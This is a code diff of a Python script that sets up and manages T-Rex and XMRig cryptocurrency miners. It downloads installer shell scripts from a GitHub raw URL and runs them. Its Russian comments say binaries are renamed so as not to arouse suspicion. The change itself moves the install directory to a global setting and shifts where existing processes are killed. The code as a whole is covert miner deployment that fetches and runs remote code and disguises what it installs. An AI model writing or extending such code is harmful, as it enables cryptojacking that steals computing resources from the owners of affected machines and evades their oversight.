@@ -12,11 +12,12 @@ PUBLIC_IP = "{HARDCODED_PUBLIC_IP}"
 KRX_WALLET = "{KRX_WALLET}"
 OCEAN_WALLET = "{OCEAN_WALLET}"
 
+INSTALL_DIR = os.path.expanduser("~/.local/bin")
+
 TREX_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh",  # Замени
     "INSTALLER_NAME": "install_t.sh",
     "BINARY_NAME": "TREX_BIN",  # Новое имя, чтобы не было подозрений
-    "INSTALL_DIR": os.path.expanduser("~/.local/bin"),  # Папка для бинарника
     "LOG_FILE": "t.log",
     "API_PORT": 60000,
     "API_TYPE": "trex"
@@ -26,7 +27,6 @@ XMRIG_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh",  # Замени
     "INSTALLER_NAME": "install_x.sh",
     "BINARY_NAME": "XMRIG_BIN",  # Новое имя
-    "INSTALL_DIR": os.path.expanduser("~/.local/bin"),  # Папка для бинарника
     "LOG_FILE": "x.log",
     "API_PORT": 60001,
     "API_TYPE": "xmrig"
@@ -81,8 +81,7 @@ def get_pid_by_name(name):
 
 def run_installer_script_if_needed(config):
     """Запускает скрипт установки, только если бинарник не найден."""
-    install_dir = Path(config["INSTALL_DIR"])
-    kill_processes_by_path_prefix(config["INSTALL_DIR"])
+    install_dir = Path(INSTALL_DIR)
     install_dir.mkdir(exist_ok=True, parents=True)
 
     binary_path = install_dir / config["BINARY_NAME"]
@@ -175,6 +174,7 @@ if not (KRX_WALLET and OCEAN_WALLET and PUBLIC_IP):
     print("=" * 50 + "\n")
 else:
     print("Starting miner setup and management...")
+    kill_processes_by_path_prefix(INSTALL_DIR)
     for config in MINER_CONFIGS:
         run_installer_script_if_needed(config)
 
